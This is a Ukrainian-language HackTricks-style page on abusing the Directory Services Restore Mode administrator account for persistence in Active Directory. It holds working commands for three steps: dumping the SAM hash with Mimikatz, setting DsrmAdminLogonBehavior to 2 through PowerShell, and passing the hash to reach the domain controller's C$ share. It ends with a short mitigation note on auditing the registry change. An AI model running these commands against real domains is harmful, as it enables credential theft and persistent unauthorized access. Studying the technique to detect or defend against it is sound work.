# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Кожен контролер домену має обліковий запис адміністратора Directory Services Restore Mode (DSRM). Його пароль задається під час підвищення контролера домену та є окремим від облікових записів домену Active Directory.<sup>[[1]](#references)</sup>

Зловмисник, який має адміністративний контроль над контролером домену, може витягнути локальну базу даних SAM і отримати NTLM-хеш адміністратора DSRM. Наведена нижче команда Mimikatz виконує цю операцію:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
За замовчуванням обліковий запис DSRM призначений для режиму відновлення. Встановлення `DsrmAdminLogonBehavior` у значення `2` дозволяє цьому локальному обліковому запису проходити автентифікацію, коли контролер домену працює у звичайному режимі. Перевірте значення перед його зміною:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Отриманий хеш можна використати в сесії pass-the-hash для доступу до таких ресурсів, як адміністративна шара `C$`. Для цього локального облікового запису використовуйте ім’я комп’ютера контролера домену як значення `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Пом'якшення

- Аудитуйте зміни в `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Подія безпеки 4657 реєструє зміну значення реєстру, коли для ключа налаштовано SACL для аудиту операцій **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Скидання пароля адміністратора Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Підступне закріплення в Active Directory №11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Підступне закріплення в Active Directory №13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Подія 4657 — Значення реєстру було змінено](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
